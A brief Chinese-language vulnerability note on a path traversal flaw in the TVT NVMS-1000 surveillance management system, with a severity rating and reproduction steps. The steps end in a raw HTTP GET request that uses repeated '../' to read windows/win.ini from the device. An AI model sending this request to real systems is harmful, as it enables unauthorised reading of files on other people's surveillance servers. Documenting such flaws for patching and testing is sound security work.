# TVT数码科技 NVMS-1000 路径遍历漏洞

## 漏洞描述
TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面如下



![](images/202202162301376.png)发送请求包读取文件

```plain
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 
Cache-Control: max-age=0
